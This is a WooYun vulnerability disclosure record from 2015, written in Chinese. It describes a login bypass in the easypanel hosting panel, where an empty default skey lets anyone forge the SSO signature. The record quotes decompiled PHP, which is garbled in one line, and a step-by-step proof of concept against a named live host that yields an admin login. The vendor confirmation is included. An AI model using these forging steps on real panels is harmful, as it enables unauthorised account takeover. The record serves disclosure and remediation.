{"id": 67244, "wybug_id": "wooyun-2015-0134768", "wybug_title": "easypanel 登陆绕过(补充互联网实例)", "wybug_corp": "kanglesoft.com", "wybug_author": "路人甲", "wybug_date": "2015-08-18 13:49", "wybug_open_date": "2015-11-16 14:46", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-16：\t细节向公众公开  简要描述： 登陆绕过 详细说明：  互联网实例测试失败，是因为这个漏洞的条件是没有修改默认的skey。并不能通杀所有的easypanel。这个条件跟http://wooyun.org/bugs/wooyun-2014-080099 是一样的。如果修改了，就会失效。绕过的逻辑也是一模一样的。因为我估计厂商是把代码直接复制了一份，做了一些修改作为一个应用的。最新版easypanel的解密代码可以从这里下载：链接: http://pan.baidu.com/s/1bn37KOR 密码: uapr  可以看到最新版做了修复。但是另外一处却没有修复。原理同http://wooyun.org/bugs/wooyun-2010-080099 厂商只修复了文中提到的那个地方。在其他地方有相同的逻辑但是没有修复。 skey默认为空 /vhost/control/sso.ctl.php 代码如下：\n<?php/** * * @ IonCube v7 Decoder By DoraemonPT * * @ Version  : 1,0,0,0 * @ Author   : DoraemonPT * @ Release on : 19-08-2013 * @ Website  : http://easytoyou.eu * **/class SsoControl extends Control {\tfunction hello() {\t\theader( 'p3p: CP=\"CAO DSP COR CUR ADM DEV TAI PSA PSD IVAi IVDi CONi TELo OTPi OUR DELi SAMi OTRi UNRi PUBi IND PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA POL HEA PRE GOV\"' );\t\tsession_unset(  );\t\t$base_passwd = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789';\t\t$base_len = strlen( $base_passwd );\t\t$len = 26;\t\t$sess_key = '';\t\t$i = 10;\t\twhile ($i < $len) {\t\t\t$sess_key .= $base_passwd[rand(  ) % $base_len];\t\t\t++$i;\t\t}\t\t$url = $_REQUEST['url'] . '&r=' . $sess_key;\t\t$_SESSION['sess_key'] = $sess_key;\t\theader( 'Cache-Control: no-cache,no-store' );\t\theader( 'Location: ' . $url );\t\texit(  );\t}\tfunction login() {\t\tif ($_SESSION['sess_key'] == '') {\t\t\texit( 'error,sess_key is empty' );\t\t}\t\t$name = $_REQUEST['name'];\t\t$skey = daocall( 'setting', 'get', array( 'skey' ) );\t\t$str = $_REQUEST['r'] . $name . $_SESSION[sess_key] . $skey;\t\tmd5( $str );\t\t$md5str = ;\t\tif (( strtolower( $md5str ) == $_REQUEST['s'] && $_REQUEST['s'] != '' )) {\t\t\tregisterRole( 'vhost', $_REQUEST['name'] );\t\t\t$_SESSION['login_from'] = 'vhost';\t\t\theader( 'Location: index.php' );\t\t\texit(  );\t\t\treturn null;\t\t}\t\texit( 'login failed' );\t}}?>默认skey为空。所以可以伪造$_REQUEST['s'] 登陆任意用户。\n   漏洞证明：  互联网实例http://585658.org:3312/vhost/index.php?c=sso&a=hello  获得 sesskeyhttp://585658.org:3312/vhost/&r=PGrCVugG6dWXig_i计算  md5（admin+PGrCVugG6dWXig_i）= bffe4aa483803656a824e046aafeb1ef访问:http://585658.org:3312/vhost/?c=sso&a=login&name=admin&s=bffe4aa483803656a824e046aafeb1ef就可以登陆admin账号。不过这个网站admn用户不存在。\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-18 14:44 厂商回复： 已确认，问题确实存在，已修复。感谢反馈。如有需要，可联系我们客服赠送kangle web server商业版一套。或dnsdun一年入门版套餐 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}